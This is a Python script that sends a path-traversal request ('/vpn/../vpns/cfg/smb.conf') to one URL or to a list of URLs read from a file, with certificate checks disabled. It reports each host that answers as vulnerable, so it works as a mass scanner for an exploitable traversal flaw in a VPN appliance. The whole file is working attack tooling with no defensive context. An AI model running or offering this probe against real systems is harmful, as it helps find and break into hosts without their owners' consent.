# -*- coding: utf-8 -*-
import requests
import sys
import argparse

requests.packages.urllib3.disable_warnings()

def Test(url):
    tmp = url
    url = url.split('//')[0]+"//"+url.split("//")[1].split('/')[0]+'/vpn/../vpns/cfg/smb.conf'
    try:
        cont = requests.get(url,verify=False,timeout=5)
        if cont.status_code==200 and cont.status_code != 403:
            print('\033[0;32mVul '+tmp+'\033[0m')
        else:
            print("Not Vul "+tmp)
    except:
        print('\033[0;31mTimeout '+tmp+'\033[0m')

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="Test single URL")
parser.add_argument("-f", "--file", help="Test multiple URLs from file")
args = parser.parse_args()
if args.url:
    Test(args.url)
elif args.file:
    f = open(args.file,'r')
    while True:
        line = f.readline().strip('\n')
        if not line:
            break
        Test(line)
